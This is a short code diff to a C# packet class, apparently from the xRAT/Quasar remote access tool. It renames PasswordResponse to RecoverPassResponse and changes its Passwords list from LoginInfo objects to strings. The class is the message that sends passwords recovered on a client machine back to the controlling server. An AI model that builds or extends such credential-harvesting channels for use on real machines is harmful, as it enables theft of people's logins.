@@ -1,20 +1,21 @@
 ﻿using ProtoBuf;
+using System;
 using System.Collections.Generic;
 using xServer.Core.Recovery.Helper;
 
 namespace xServer.Core.Packets.ClientPackets
 {
     [ProtoContract]
-    public class PasswordResponse : IPacket
+    public class RecoverPassResponse : IPacket
     {
         [ProtoMember(1)]
-        public List<LoginInfo> Passwords { get; set; }
+        public List<string> Passwords { get; set; }
 
-        public PasswordResponse()
+        public RecoverPassResponse()
         {
         }
 
-        public PasswordResponse(List<LoginInfo> data)
+        public RecoverPassResponse(List<string> data)
         {
             this.Passwords = data;
         }
